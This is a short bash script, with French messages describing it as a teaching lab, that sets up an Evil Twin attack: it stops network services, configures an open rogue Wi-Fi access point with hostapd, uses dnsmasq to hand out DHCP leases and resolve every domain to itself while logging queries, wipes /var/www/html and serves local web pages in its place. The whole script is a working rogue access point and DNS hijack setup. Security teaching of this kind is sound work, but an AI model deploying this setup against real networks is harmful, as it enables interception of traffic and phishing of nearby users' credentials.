#!/bin/bash

set -e

WIFI_IFACE="wlan0"
SSID="TP_EVIL_TWIN_DEMO"
CHANNEL="6"
AP_IP="192.168.50.1"

echo "[+] Configuration du TP Evil Twin pédagogique"

echo "[+] Arrêt des services conflictuels..."
sudo systemctl stop NetworkManager || true
sudo systemctl stop wpa_supplicant || true
sudo systemctl stop dnsmasq || true
sudo systemctl stop hostapd || true

echo "[+] Configuration IP de l'interface Wi-Fi..."
sudo ip link set $WIFI_IFACE down
sudo ip addr flush dev $WIFI_IFACE
sudo ip addr add $AP_IP/24 dev $WIFI_IFACE
sudo ip link set $WIFI_IFACE up

echo "[+] Configuration hostapd..."
cat > /tmp/hostapd-tp.conf << EOF
interface=$WIFI_IFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=$CHANNEL
auth_algs=1
wmm_enabled=0
EOF

echo "[+] Configuration dnsmasq..."
cat > /tmp/dnsmasq-tp.conf << EOF
interface=$WIFI_IFACE
dhcp-range=192.168.50.10,192.168.50.100,255.255.255.0,12h
dhcp-option=3,$AP_IP
dhcp-option=6,$AP_IP
address=/#/$AP_IP
log-queries
log-dhcp
EOF

echo "[+] Configuration serveur web..."
sudo rm -rf /var/www/html/*
sudo cp -r ../web/* /var/www/html/
sudo systemctl restart lighttpd

echo "[+] Lancement dnsmasq..."
sudo dnsmasq -C /tmp/dnsmasq-tp.conf

echo "[+] Lancement du faux AP pédagogique..."
sudo hostapd /tmp/hostapd-tp.conf